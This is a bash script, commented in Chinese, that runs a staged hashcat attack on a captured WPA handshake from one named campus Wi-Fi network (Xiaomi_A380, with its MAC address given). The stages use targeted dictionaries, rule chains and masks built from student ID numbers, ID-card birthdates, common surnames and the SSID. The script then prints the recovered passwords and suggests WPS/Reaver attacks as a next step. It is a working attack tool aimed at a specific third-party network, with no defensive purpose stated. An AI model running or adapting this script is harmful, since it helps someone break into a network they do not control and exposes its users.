#!/bin/bash
# ============================================================================
# Xiaomi_A380 校园路由器专属破解脚本 (高精度 + 强密码版)
# ============================================================================
# 目标 SSID : Xiaomi_A380 (注意: 实际带下划线!)
# 目标 MAC  : A4:BA:70:04:1A:7E
# 硬件      : Apple M1 Metal GPU (hashcat v7.1.2)
# 背景      : 校园环境 (学号/手机号/身份证生日/强密码)
# ----------------------------------------------------------------------------
# 核心改进要点:
#   [核心] SSID 错写为 "XiaomiA380" 无下划线,漏掉最关键的定向密码!
#   [新增] 校园场景: 学号 8/10/12 位、大学拼音、宿舍号
#   [新增] 身份证 YYYYMMDD 生日 (校园网密码最常见)
#   [新增] 强密码模式 (大写+小写+数字+特殊, 企业/校园强制)
#   [新增] 专属强密码掩码文件 campus-strong-masks.hcmask
#   [新增] 字典+规则链式攻击 (china-wifi.rule + best64.rule)
#   [删除] 已验证无效的大字典: top2m/5m/20m、rockyou、mega160m、cn-top100w
#   [删除] 已验证无效的大字典: 02-names-cn、03-phone-numbers、
#          05-chinese-full-410w、06-surnames-birthdays (都跑过都 miss)
# ----------------------------------------------------------------------------
# 基于 CERNET 研究:
#   - 8 位纯数字占 21.7%  (已跑,保留快速验证)
#   - 11 位纯数字占 13.9% (已跑,保留)
#   - 字母+数字混合占 35.9% — 重点
#   - 特殊字符 "." 和 "@" 最高频 — 重点
# ============================================================================

set -u

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
DICT_DIR="${SCRIPT_DIR}/dicts"
WORK_DIR="${SCRIPT_DIR}/work/xiaomi_a380"
# 支持: bash crack_xiaomi_a380.sh [hash文件]
HASH_FILE="${1:-${SCRIPT_DIR}/captures/combined.hc22000}"

mkdir -p "${WORK_DIR}"

# ── 目标信息 ──
TARGET_SSID="Xiaomi_A380"
TARGET_MAC="a4ba70041a7e"

echo "============================================"
echo "  Xiaomi_A380 校园路由器破解脚本"
echo "  SSID : ${TARGET_SSID}  (带下划线!)"
echo "  MAC  : A4:BA:70:04:1A:7E"
echo "  Hash : $(basename "${HASH_FILE}")"
echo "============================================"

# ── 依赖检查 ──
HASHCAT=$(which hashcat)
if [ -z "${HASHCAT}" ]; then
    echo "[!] hashcat 未安装: brew install hashcat"
    exit 1
fi
echo "hashcat: $(${HASHCAT} --version)"
${HASHCAT} -I 2>/dev/null | grep -E "Name|Type" | head -4
echo ""

if [ ! -f "${HASH_FILE}" ]; then
    echo "[!] 找不到 hash 文件: ${HASH_FILE}"
    exit 1
fi
LINES=$(grep -c "^WPA\*" "${HASH_FILE}" 2>/dev/null)
echo "  hashline 数量: ${LINES}"
[ "${LINES}" -eq 0 ] && echo "[!] hash 文件为空" && exit 1

# ── potfile 与输出 ──
POTFILE="${WORK_DIR}/xiaomi_a380.potfile"
OUTFILE="${WORK_DIR}/xiaomi_a380_cracked.txt"

# hashcat 基础命令 (M1 Metal GPU 优化)
HC_BASE="${HASHCAT} -m 22000 ${HASH_FILE} \
    --potfile-path ${POTFILE} \
    --outfile ${OUTFILE} --outfile-format 2 \
    -w 3 --status --status-timer 10 \
    --hwmon-temp-abort=95"

# ── 查找规则 ──
RULE_BEST64=""
for rp in $(find /opt/homebrew /usr/local /usr/share -path '*/hashcat/rules/best64.rule' 2>/dev/null); do
    [ -f "$rp" ] && RULE_BEST64="$rp" && break
done
RULE_CHINA="${DICT_DIR}/china-wifi.rule"
MASK_CHINA="${DICT_DIR}/00-china-wifi-masks.hcmask"
MASK_CAMPUS="${DICT_DIR}/campus-strong-masks.hcmask"

echo "  规则文件:"
echo "    best64:     ${RULE_BEST64:-(未找到)}"
echo "    china-wifi: ${RULE_CHINA}"
echo "  掩码文件:"
echo "    china-wifi: ${MASK_CHINA}"
echo "    campus:     ${MASK_CAMPUS}"

ROUND=0
START_TIME=$(date +%s)

# ── 工具函数 ──
is_done() {
    [ -f "${POTFILE}" ] || return 1
    local cnt
    cnt=$(wc -l < "${POTFILE}" | tr -d ' ')
    if [ "${cnt}" -ge "${LINES}" ]; then
        echo "  ★★★ 全部 hashline 已破解 ${cnt}/${LINES},跳过剩余 ★★★"
        return 0
    fi
    return 1
}

show_cracked() {
    [ -f "${POTFILE}" ] || return
    local cnt
    cnt=$(wc -l < "${POTFILE}" | tr -d ' ')
    [ "${cnt}" -eq 0 ] && return
    echo "  ★ 已破解 ${cnt} 条 ★"
    ${HASHCAT} -m 22000 "${HASH_FILE}" --potfile-path "${POTFILE}" --show 2>/dev/null | while IFS=: read -r hash pw; do
        local ssid_hex ssid
        ssid_hex=$(echo "$hash" | cut -d'*' -f6)
        ssid=$(echo "$ssid_hex" | xxd -r -p 2>/dev/null || echo "$ssid_hex")
        echo "  -> ${ssid}: ${pw}"
    done
}

run_dict() {
    local name="$1" dict="$2"
    is_done && return 0
    [ -f "$dict" ] || { echo "  [跳过] $name — 字典不存在"; return 0; }
    # 过滤到 8-63 位
    local filtered="${WORK_DIR}/f_$(basename "$dict")"
    awk 'length>=8 && length<=63' "$dict" > "${filtered}"
    local fn
    fn=$(wc -l < "${filtered}" | tr -d ' ')
    [ "${fn}" -lt 5 ] && { rm -f "${filtered}"; return 0; }
    ROUND=$((ROUND + 1))
    echo ""
    echo "────────────────────────────────────────"
    echo "  第 ${ROUND} 轮: ${name} (${fn} 条)"
    echo "────────────────────────────────────────"
    ${HC_BASE} -a 0 "${filtered}"
    rm -f "${filtered}"
    show_cracked
}

run_dict_rule() {
    local name="$1" dict="$2"; shift 2
    is_done && return 0
    [ -f "$dict" ] || return 0
    ROUND=$((ROUND + 1))
    local n
    n=$(wc -l < "$dict" | tr -d ' ')
    echo ""
    echo "────────────────────────────────────────"
    echo "  第 ${ROUND} 轮: ${name} (${n}条 x 规则)"
    echo "────────────────────────────────────────"
    ${HC_BASE} -a 0 "$dict" "$@"
    show_cracked
}

run_mask() {
    local name="$1"; shift
    is_done && return 0
    ROUND=$((ROUND + 1))
    echo ""
    echo "────────────────────────────────────────"
    echo "  第 ${ROUND} 轮: ${name}"
    echo "────────────────────────────────────────"
    ${HC_BASE} -a 3 "$@"
    show_cracked
}

run_hybrid_dm() {
    local name="$1" dict="$2" mask="$3"
    is_done && return 0
    [ -f "$dict" ] || return 0
    # 字典不做 8 位下限过滤（hybrid 模式允许较短基础词）
    local filtered="${WORK_DIR}/hd_$(basename "$dict")"
    awk 'length>=1 && length<=60' "$dict" > "${filtered}"
    local n
    n=$(wc -l < "${filtered}" | tr -d ' ')
    [ "$n" -lt 5 ] && { rm -f "${filtered}"; return 0; }
    ROUND=$((ROUND + 1))
    echo ""
    echo "────────────────────────────────────────"
    echo "  第 ${ROUND} 轮: ${name} (${n}条 + 掩码${mask})"
    echo "────────────────────────────────────────"
    ${HC_BASE} -a 6 "${filtered}" "$mask"
    rm -f "${filtered}"
    show_cracked
}

# ============================================================================
# 阶段 0: 检查/生成 超强定向字典 (如果还没生成就先生成)
# ============================================================================
DICT_TARGETED="${WORK_DIR}/xiaomi_a380_targeted.txt"
GEN_SCRIPT="${SCRIPT_DIR}/gen_xiaomi_a380.py"
if [ ! -f "${DICT_TARGETED}" ] || [ "${GEN_SCRIPT}" -nt "${DICT_TARGETED}" ]; then
    echo ""
    echo ">>>>>> 阶段 0: 生成 超强定向字典 <<<<<<"
    python3 "${GEN_SCRIPT}"
fi
DICT_COUNT=$(wc -l < "${DICT_TARGETED}" | tr -d ' ')
echo "  核心定向字典已就绪: ${DICT_COUNT} 条"

# ============================================================================
# 阶段 1: 超强定向字典 (最高优先级,覆盖最多盲区)
# ============================================================================
echo ""
echo ">>>>>> 阶段 1: 超强定向字典攻击 (最高优先级) <<<<<<"
run_dict "核心定向字典(校园+小米+身份证)" "${DICT_TARGETED}"

# ============================================================================
# 阶段 2: 核心字典 + 规则链式 (最有效的变形攻击)
# ============================================================================
echo ""
echo ">>>>>> 阶段 2: 核心字典 × 规则变形 <<<<<<"
if [ -n "${RULE_BEST64}" ]; then
    run_dict_rule "核心字典 × best64" "${DICT_TARGETED}" -r "${RULE_BEST64}"
fi
if [ -f "${RULE_CHINA}" ]; then
    run_dict_rule "核心字典 × china-wifi" "${DICT_TARGETED}" -r "${RULE_CHINA}"
fi

# ============================================================================
# 阶段 3: 超精准定向掩码 (keyspace 极小,秒级完成)
# ============================================================================
echo ""
echo ">>>>>> 阶段 3: 超精准定向掩码 (秒级) <<<<<<"

# SSID 本体 + 4 位数字 (10^4 = 10000)
run_mask "Xiaomi_A380+4数字"   'Xiaomi_A380?d?d?d?d'
run_mask "xiaomi_a380+4数字"   'xiaomi_a380?d?d?d?d'
run_mask "XiaomiA380+4数字"    'XiaomiA380?d?d?d?d'
run_mask "xiaomia380+4数字"    'xiaomia380?d?d?d?d'
# SSID + 6 位数字 (10^6 = 1M)
run_mask "Xiaomi_A380+6数字"   'Xiaomi_A380?d?d?d?d?d?d'
run_mask "xiaomi_a380+6数字"   'xiaomi_a380?d?d?d?d?d?d'
# SSID + 8 位数字 (10^8 = 100M, ~15 分钟)
run_mask "Xiaomi_A380+8数字"   'Xiaomi_A380?d?d?d?d?d?d?d?d'
run_mask "xiaomi_a380+8数字"   'xiaomi_a380?d?d?d?d?d?d?d?d'
# 反向: 数字 + SSID
run_mask "4数字+Xiaomi_A380"   '?d?d?d?d' 'Xiaomi_A380'
run_mask "6数字+xiaomi_a380"   '?d?d?d?d?d?d' 'xiaomi_a380'

# a380 / A380 + 数字
run_mask "a380+4数字"          'a380?d?d?d?d'
run_mask "a380+6数字"          'a380?d?d?d?d?d?d'
run_mask "a380+8数字"          'a380?d?d?d?d?d?d?d?d'
run_mask "A380+4数字"          'A380?d?d?d?d'
run_mask "A380+6数字"          'A380?d?d?d?d?d?d'
run_mask "A380+8数字"          'A380?d?d?d?d?d?d?d?d'

# xiaomi + 4-8 数字
run_mask "xiaomi+4数字"        'xiaomi?d?d?d?d'
run_mask "xiaomi+6数字"        'xiaomi?d?d?d?d?d?d'
run_mask "xiaomi+8数字"        'xiaomi?d?d?d?d?d?d?d?d'

# ============================================================================
# 阶段 4: 身份证生日定向掩码 (校园网初始密码核心)
# ============================================================================
echo ""
echo ">>>>>> 阶段 4: 身份证 YYYYMMDD 生日掩码 <<<<<<"

# 19YYMMDD (19?d?d?d?d?d?d = 10^6 = 1M, 秒级)
run_mask "19??年月日 8位生日"  '19?d?d?d?d?d?d'
# 20YYMMDD
run_mask "20??年月日 8位生日"  '20?d?d?d?d?d?d'
# 注: 14 位 "身份证前6位+生日8位" keyspace 10^10 ≈ 55 小时,
#     核心字典已覆盖常见组合, 此处跳过
# 8 位身份证日期 + 2 位尾缀 (YYYYMMDDXX = 10^10, 太慢) — 跳过
# 改用: 19YYMMDD + 2 位数字尾缀 = 10^8 ≈ 30 分钟 (M1)
run_mask "19??年月日+2数字"    '19?d?d?d?d?d?d?d?d'
run_mask "20??年月日+2数字"    '20?d?d?d?d?d?d?d?d'

# ============================================================================
# 阶段 5: 学号掩码 (8-12 位数字,年份前缀)
# ============================================================================
echo ""
echo ">>>>>> 阶段 5: 校园学号掩码 <<<<<<"

# 8 位: 201?/202? + 5 位后缀
run_mask "学号 201?+5位后缀"   '201?d?d?d?d?d'
run_mask "学号 202?+5位后缀"   '202?d?d?d?d?d'
# 10 位: YYYY + 6 位
run_mask "学号 2020+6位"       '2020?d?d?d?d?d?d'
run_mask "学号 2021+6位"       '2021?d?d?d?d?d?d'
run_mask "学号 2022+6位"       '2022?d?d?d?d?d?d'
run_mask "学号 2023+6位"       '2023?d?d?d?d?d?d'
run_mask "学号 2024+6位"       '2024?d?d?d?d?d?d'
run_mask "学号 2025+6位"       '2025?d?d?d?d?d?d'

# ============================================================================
# 阶段 6: CERNET 研究 — 姓拼音+8 位数字 (占 11 位字母数字密码 31%)
# ============================================================================
echo ""
echo ">>>>>> 阶段 6: 姓拼音+生日掩码 (CERNET 最高频模式) <<<<<<"

# 单个姓 + 8 位数字 = 10^8 ≈ 30 分钟 (M1 约 50k H/s)
# 仅保留 TOP 中国姓氏,避免总时长失控
# 全部跑完约 5-7 小时,建议按顺序中途 Ctrl+C 跳过
for surname in wang li zhang liu chen yang; do
    run_mask "${surname}+8位数字(姓+生日)" "${surname}?d?d?d?d?d?d?d?d"
done

# CERNET: "2 字母姓 + 8 位数字 + '.'" 是 11 位特殊字符密码最高频
# 2 字母 * 8 数字 * 1 字符 = 26^2 * 10^8 ≈ 6.8 * 10^10 — 跳过全量
# 改为: 特定姓 + 8 数字 + "." (单姓 10^8 ≈ 30 分钟/个,仅跑 TOP 2)
for surname in li wu; do
    run_mask "${surname}+8位数字+点号" "${surname}?d?d?d?d?d?d?d?d."
done

# ============================================================================
# 阶段 7: 强密码掩码 — 校园/企业环境强制 (campus-strong-masks.hcmask)
# ============================================================================
echo ""
echo ">>>>>> 阶段 7: 校园强密码掩码集 <<<<<<"
[ -f "${MASK_CAMPUS}" ] && run_mask "campus-strong-masks 合集" "${MASK_CAMPUS}"

# ============================================================================
# 阶段 8: 中国 WPA 通用掩码合集
# ============================================================================
echo ""
echo ">>>>>> 阶段 8: 中国 WPA 掩码合集 <<<<<<"
[ -f "${MASK_CHINA}" ] && run_mask "00-china-wifi-masks 合集" "${MASK_CHINA}"

# ============================================================================
# 阶段 9: 核心字典 + 混合掩码尾缀 (-a 6, 典型人类"单词+数字/特殊"模式)
# ----------------------------------------------------------------------------
# 核心字典 19 万条 × 掩码 = keyspace 爆炸,仅保留小倍率掩码:
#   × 1 字符 (如 '.', '@')       =   19 万 × 10-33 ≈ 600 万  (秒级)
#   × 2 位数字 (?d?d)            =   19 万 × 100   ≈ 1900 万 (分钟)
#   × 4 位数字 (?d?d?d?d) = 19 亿  (10 小时 — 跳过)
# ============================================================================
echo ""
echo ">>>>>> 阶段 9: 核心字典 + 短尾缀混合 <<<<<<"
run_hybrid_dm "核心字典+点号"          "${DICT_TARGETED}" '.'
run_hybrid_dm "核心字典+@号"           "${DICT_TARGETED}" '@'
run_hybrid_dm "核心字典+!号"           "${DICT_TARGETED}" '!'
run_hybrid_dm "核心字典+#号"           "${DICT_TARGETED}" '#'
run_hybrid_dm "核心字典+2位数字"       "${DICT_TARGETED}" '?d?d'
# 精选更小字典做 4 位数字后缀 (轻量: wpa-top4800 或自定义)
# wpa-top4800 是 4800 条 × 10^4 = 4.8 千万 ≈ 15 分钟
run_hybrid_dm "wpa-top4800+4位数字"  "${DICT_DIR}/wpa-top4800.txt" '?d?d?d?d'
run_hybrid_dm "wpa-top4800+6位数字"  "${DICT_DIR}/wpa-top4800.txt" '?d?d?d?d?d?d'

# ============================================================================
# 阶段 10: 中等规模字典 × 规则 (之前未与规则组合跑过)
# ============================================================================
echo ""
echo ">>>>>> 阶段 10: 中等字典 + 规则链 (纯字典已跑,此处加规则) <<<<<<"
if [ -f "${RULE_CHINA}" ]; then
    for df in "${DICT_DIR}/wpa-top4800.txt" \
              "${DICT_DIR}/probable-wpa.txt" \
              "${DICT_DIR}/08-names-pinyin.txt" \
              "${DICT_DIR}/04-pinyin-numbers.txt"; do
        [ -f "$df" ] || continue
        sz=$(stat -f%z "$df" 2>/dev/null || stat -c%s "$df" 2>/dev/null || echo 0)
        # 控制大小: 超过 50MB 的跳过(规则组合会爆炸)
        [ "$sz" -gt 52428800 ] && continue
        run_dict_rule "$(basename "$df") × china-wifi" "$df" -r "${RULE_CHINA}"
    done
fi
if [ -n "${RULE_BEST64}" ]; then
    for df in "${DICT_DIR}/wpa-top4800.txt" \
              "${DICT_DIR}/probable-wpa.txt"; do
        [ -f "$df" ] || continue
        run_dict_rule "$(basename "$df") × best64" "$df" -r "${RULE_BEST64}"
    done
fi

# ============================================================================
# 最终结果输出
# ============================================================================
END_TIME=$(date +%s)
ELAPSED=$(( (END_TIME - START_TIME) / 60 ))

echo ""
echo "============================================"
echo "  全部完成 | 总耗时: ${ELAPSED} 分钟"
echo "============================================"

RESULT_FILE="${WORK_DIR}/result_xiaomi_a380.txt"
: > "${RESULT_FILE}"

CRACKED_CNT=0
if [ -f "${POTFILE}" ] && [ -s "${POTFILE}" ]; then
    CRACKED_CNT=$(${HASHCAT} -m 22000 "${HASH_FILE}" --potfile-path "${POTFILE}" --show 2>/dev/null | grep -c "^WPA\*")
fi

if [ "${CRACKED_CNT}" -gt 0 ]; then
    echo ""
    echo "  ╔════════════════════════════════════════╗"
    echo "  ║    破解成功: ${CRACKED_CNT} 个 WiFi             ║"
    echo "  ╠════════════════════════════════════════╣"
    ${HASHCAT} -m 22000 "${HASH_FILE}" --potfile-path "${POTFILE}" --show 2>/dev/null | while IFS=: read -r hash pw; do
        _bssid=$(echo "$hash" | cut -d'*' -f4)
        _ssid_hex=$(echo "$hash" | cut -d'*' -f6)
        _ssid=$(echo "$_ssid_hex" | xxd -r -p 2>/dev/null || echo "$_ssid_hex")
        _mac=$(echo "$_bssid" | sed 's/\(..\)/\1:/g; s/:$//')
        echo "  ║  WiFi : ${_ssid}"
        echo "  ║  密码 : ${pw}"
        echo "  ║  MAC  : ${_mac}"
        echo "  ║"
        printf "WiFi: %s\n密码: %s\nMAC:  %s\n\n" "${_ssid}" "${pw}" "${_mac}" >> "${RESULT_FILE}"
    done
    echo "  ╚════════════════════════════════════════╝"
    echo ""
    echo "  结果已保存: ${RESULT_FILE}"
else
    echo ""
    echo "  未破解 — 密码可能更复杂,建议:"
    echo "    1. 检查 hash 文件质量 (重新抓包)"
    echo "    2. 考虑云 GPU (更大 keyspace 暴力)"
    echo "    3. 物理层攻击 (WPS PIN / Reaver)"
fi

echo ""
echo "  清理临时文件..."
rm -f "${WORK_DIR}"/f_*.txt "${WORK_DIR}"/hd_*.txt 2>/dev/null
echo "  完成"
echo ""
